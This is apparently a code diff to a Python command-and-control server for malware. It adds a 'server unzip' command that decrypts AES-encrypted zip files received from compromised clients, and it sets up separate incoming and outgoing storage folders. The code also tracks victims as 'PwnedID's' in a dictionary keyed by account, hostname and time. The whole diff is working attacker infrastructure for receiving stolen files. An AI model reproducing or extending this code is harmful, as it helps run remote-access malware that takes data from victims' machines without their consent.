@@ -8,10 +8,11 @@ from colorama import Fore
 from urllib.parse import unquote_plus
 from inputimeout import inputimeout, TimeoutOccurred
 from os import path, mkdir
+from pyzipper import AESZipFile
 from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST, CWD_RESPONSE, FILE_REQUEST, RESPONSE, RESPONSE_KEY, INPUT_TIMEOUT, KEEP_ALIVE_CMD,
-                      BIND_ADDR, PORT, FILE_SEND, STORAGE)
+                      BIND_ADDR, PORT, FILE_SEND, INCOMING, OUTGOING, ZIP_PASSWORD)
 
 
 def get_new_client():
@@ -158,6 +159,25 @@ class C2Handler(BaseHTTPRequestHandler):
                                   f"{Fore.GREEN}[+] => {Fore.RESET}Use {Fore.LIGHTYELLOW_EX}server show clients "
                                   f"{Fore.RESET}command to see Available PwnedID's\n")
 
+                    # server unzip command allows us to unzip decrypted zip files in incoming folder on C2 Server
+                    elif command.startswith("server unzip"):
+                        # Initialize filename to avoid PyCharm Warning
+                        filename = None
+
+                        # Unzip AES Encrypted file that is setting in our storage folder
+                        try:
+                            filename = command.split()[2]
+                            with AESZipFile(f"{INCOMING}/{filename}") as zipFile:
+                                zipFile.setpassword(ZIP_PASSWORD)
+                                zipFile.extractall(INCOMING)
+                                print(f"[+]-Server => {INCOMING}/{filename} is now Unzipped and Decrypted. \n")
+                        except FileNotFoundError:
+                            print(f"[-]-Server => {filename} was not found in {INCOMING}. \n")
+                        except OSError:
+                            print(f"[-]-Server => OS Error when Unzipped-Decrypted {filename} in {INCOMING}.\n")
+                        except IndexError:
+                            print(f"[-]-Server => You must enter a filename located in {INCOMING} to Unzip-Decrypt it. \n")
+
                     elif command.startswith("server exit"):
                         # Shutting Down the C2 Server
                         print(Fore.LIGHTRED_EX + f"\n[*] Server: {server.server_address[0]} has been shutting down.\n"
@@ -262,7 +282,7 @@ class C2Handler(BaseHTTPRequestHandler):
             filename = cipher.decrypt(filename.encode()).decode()
 
             # Add filename to our storage path
-            incomingFile = STORAGE + "/" + filename
+            incomingFile = INCOMING + "/" + filename
 
             # We need Content Length to properly read in the file
             # noinspection PyTypeChecker
@@ -337,9 +357,13 @@ pwnedId = 0
 # value follow this pattern => (account@hostname@epoch time)
 pwnedDict = {}
 
-# If the STORAGE Directory is not present on our c2 server, Create it
-if not path.isdir(STORAGE):
-    mkdir(STORAGE)
+# If the INCOMING Directory is not present on our c2 server, Create it
+if not path.isdir(INCOMING):
+    mkdir(INCOMING)
+
+# If the OUTGOING Directory is not present on our c2 server, Create it
+if not path.isdir(OUTGOING):
+    mkdir(OUTGOING)
 
 
 # This a current working directory from the client belonging to active session
